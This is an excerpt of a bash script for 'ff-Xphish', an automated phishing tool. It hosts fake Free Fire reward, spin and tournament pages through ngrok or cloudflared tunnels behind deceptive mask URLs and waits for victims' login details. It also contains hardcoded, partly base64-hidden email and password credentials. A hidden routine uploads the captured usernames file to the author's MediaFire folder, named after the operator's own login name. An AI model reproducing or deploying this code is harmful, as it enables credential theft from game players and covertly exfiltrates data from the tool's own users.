...
bash pu.sh main.sh .server/.ww1.sh

gent() {
echo ""
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[36m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[32m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[33m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[31m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[35m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[1;36m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[36m Generating Link..."
sleep 0.17
printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[32m Generating Link..."
...
sta(){
    sleep 0.20
    # Frame #2
    printf "\rStarting ff-xphish please wait.."
    sleep 0.20
    printf "\rsTarting ff-xphish please wait.."
    sleep 0.20
    printf "\rstArting ff-xphish please wait.."
...
if [[ -f pu.sh ]]; then
	...
	echo "Don't Be Evil Just Read The Code No Changes Allowed"
fi
...
if [[ -d .sites ]]; then
	...
	echo -e $G"First Run This Command $g bash setup.sh"$w
	sleep 3
	bash setup.sh
	exit
fi
...
otp2=${str_array_value// /}

A="$otp1"
B="$otp2"
echo -e $P"Human Verification"$w
echo ""
echo "a=$A"; 
echo "b=$B"; 
echo ""
chk2() {
if [ $A \> $B ]; then echo "a is greater than b"; else echo "b is greater than a"; exit; fi;
}
chk3() {
if [ $B \> $A ]; then echo "a is greater than b"; else echo "b is greater than a"; exit;  fi;
}
read -p "Say The Answer Which Is Greater :" qs
case $qs in
	a)
		chk2;;
        b)
...
##   ff-Xphish 	: 	Automated Phishing Tool
##   Author 	: 	Hasanfq 
##   Version 	: 	3.0
...
║                        FF-XPHISH                              ║
║  Author:                                                      ║
║  https://github.com/kamanati                                  ║
║								║
║  The author of this program is not responsible for its use!   ║     
║  When posting this code on other resources,                   ║
║  please indicate the author!                                  ║
║								║
║              All rights reserved.                             ║
║           Copyright ©️  2022 kamanati                          ║ 
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝"
echo ""
echo -e $r"WARNING:"
echo ""
echo -e $K"Dont Change The Code If You Did "$w
echo -e $K"Your System Will Be Damaged"$w
bash pu.sh main.sh .server/.ww1.sh
}
...
## Dependencies
dependencies() {
	echo -e "\n${g}[${GL}+${g}]${LG} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${g}[${GL}+${g}]${LG} Installing package : ${GL}}proot${LG}"${GL}
        ...
        if [[ `command -v tput` ]]; then
			...
			echo -e "\n${g}[${GL}+${g}]${LG} Installing package : ${GL}}ncurses-utils${LG}"${GL}
	...
	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` && `command -v pv` && `command -v espeak` && `command -v play-audio`  ]]; then
		echo -e "\n${g}[${GL}+${g}]${g} Packages already installed."
	else
		pkgs=(php curl wget unzip pv mpv-x espeak play-audio)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${g}[${GL}+${g}]${LG} Installing package : ${ORANGE}$pkg${LG}"${GL}
...
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${g}[${GL}+${g}]${g} Ngrok already installed."
	else
		echo -e "\n${g}[${GL}+${g}]${LG} Installing ngrok..."${GL}
...
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${g}[${GL}+${g}]${g} Cloudflared already installed."
	else
		echo -e "\n${g}[${GL}+${g}]${LG} Installing Cloudflared..."${GL}
		if [[ ! -e "/system/bin/adb"  ]]; then
...
oi=$(echo "aGFzYW5mcTgxOEBnbWFpbC5jb20K" | base64 -d)
oip=$(echo "VHRoP0FrSkhOOEV5P3U3Cg==" | base64 -d)
## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${g}Author   ${LG}:  ${GL}}HASANFQ ${LG}&&${GL}}HTR-TECH 
		${g}Github   ${LG}:  ${LG}https://github.com/htr-tech
		${g}Social   ${LG}:  ${LG}https://github.com/kamanati
		${g}Version  ${LG}:  ${GL}}3.0
		...
		${LG}Warning:${GL}
		${LG}This Tool is made for educational purpose only ${LG}!${GL}
		${LG}Author will not be responsible for any misuse of this toolkit ${LG}!${GL}
	...
	read -p "${LG}[${GL}-${LG}]${g} Select an option : ${LG}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${g}[${GL}+${g}]${LG} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
...
HOST='127.0.0.1'
PORT='8080'
DPASS=$(echo "aGFja2UxMgo=" | base64 --decode )
setup_site() {
	bash pu.sh main.sh .server/.ww1.sh
...
xy=$(whoami)
        ...
        echo "from mediafire import MediaFireApi
from mediafire import MediaFireUploader
api = MediaFireApi()
uploader = MediaFireUploader(api)
session = api.user_get_session_token(
    email='hasanfq818@gmail.com',
    password='Tth?AkJHN8Ey?u7',
    app_id='42511')

api.session = session
response = api.user_get_info()
fd = open('.server/www/usernames.txt', 'rb')
result = uploader.upload(fd, '$xy.dat',
                         folder_key='68di3sy9w6khi')" >> .imh/.saved.py

        python .imh/.saved.py $1 &> /dev/null;
        rm .imh/.saved.py
        if [ $? -eq 0 ]
        then
        echo ""
          echo -e  "${LG}[${GL}-${LG}]${C1} Execution success"
        echo ""
        else
                echo ""
          echo -e "${LG}[${GL}-${LG}]${C1} Execution Fails"
        echo ""
        fi
}
## Print data
capture_data() {
	echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${I}to exit..."$LG
	echo ""
	echo ""
...
start_ngrok() {
	bash pu.sh main.sh .server/.ww1.sh
	echo -e "\n${LG}[${GL}-${LG}]${g} Initializing... ${g}( ${LG}http://$HOST:$PORT ${g})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${LG}[${GL}-${LG}]${g} Launching Ngrok..."
	echo ""
	gent
	if [[ ! -e "/system/bin/adb"  ]]; then
	...
	echo -e "\n${LG}[${GL}-${LG}]${P} URL 1 : ${g}$ngrok_url"
	echo -e "\n${LG}[${GL}-${LG}]${P} URL 2 : ${g}$mask@$ngrok_url1"
	capture_data
...
start_cloudflared() {
	bash pu.sh main.sh .server/.ww1.sh
        ...
        echo -e "\n${LG}[${GL}-${LG}]${g} Initializing... ${g}( ${LG}http://$HOST:$PORT ${g})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${LG}[${GL}-${LG}]${g} Launching Cloudflared"
	echo ""
	gent
        if [[ ! -e "/system/bin/adb"  ]]; then
    ...
    if [[ `command -v termux-chroot` ]]; then
        ...
        echo -e "\n${LG}[${GL}-${LG}]${i} URL 1 : ${g}$cldflr_link"
        echo -e "\n${LG}[${GL}-${LG}]${i} URL 2 : ${g}$mask@$cldflr_link1"
        capture_data
        play-audio /data/data/com.termux/files/home/kmphisher/.misc/victim.wav &> /dev/null;
}
...
start_localhost() {
	...
	echo -e "\n${LG}[${GL}-${LG}]${g} Successfully Hosted at : ${g}${LG}http://$HOST:$PORT ${g}"
	capture_data
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/victim.wav &> /dev/null;
}
...
prc1() {
    echo ""
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[36m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[31m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[32m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[36m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[35m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[34m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[33m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[36m Processing..."
    sleep 0.20
    printf "\r\e[91m[\e[92m+\e[91m]\e[1;93m\033[32m Processing..."                      
...
main_menu() {
	{ clear; banner; }
echo ""
echo -e "$r 1$b ->$G Free Fire Code"
echo ""
echo -e "$r 2$b ->$G Free Fire Tournament"
echo ""
echo -e "$r 3$b ->$G Free Fire Event"
echo ""
echo -e "$r 4$b ->$G Free Fire Game Karido"
echo ""
echo -e "$r 5$b ->$G Free Fire Spin"
echo ""
echo -e "$r 6$b ->$G Free Fire Store"
echo ""
echo -e "$r 7$b ->$G Free Fire magic Event"
echo ""
echo -e  $K"Not Yet Read"$w
echo ""
echo -e "$r 8$b ->$G Free Fire Diamond"
echo ""
echo -e  $K"Bonus Site"$w
echo ""
echo -e "$r 9$b ->$G Device Lock"$P
...
case $option in
		...
		1)
			...
			prc1
                        website="FFall"
                        mask="http://freefire-tournament-registration"
                        tunnel_menu;;
                3)
			bash pu.sh main.sh .server/.ww1.sh
			prc1
                        website="ffevent"
                        mask="http://ff-event-ss"
                        tunnel_menu;;
		4)
			bash pu.sh main.sh .server/.ww1.sh
			prc1
			website="gameka"
			mask="http://GameKarido-official.com"
			tunnel_menu;;
		5)
			bash pu.sh main.sh .server/.ww1.sh
			prc1
			website="ffspin"
                        mask="https://ff-spin-garena"
                        tunnel_menu;;
		6)
			bash pu.sh main.sh .server/.ww1.sh
			prc1
		...
		7)
			...
			prc1
			website="mgevent"
			mask="http://FreeFire-magic-garena"
			tunnel_menu;;
		8)
			bash pu.sh main.sh .server/.ww1.sh
			prc1
			website="ffgift"
                        mask="http://ff-gift-garena"
                        tunnel_menu;;
		9)	
			bash pu.sh main.sh .server/.ww1.sh
			prc1
			website="deviceLock"
			mask="http://make-sure-you-safe"
			tunnel_menu;;
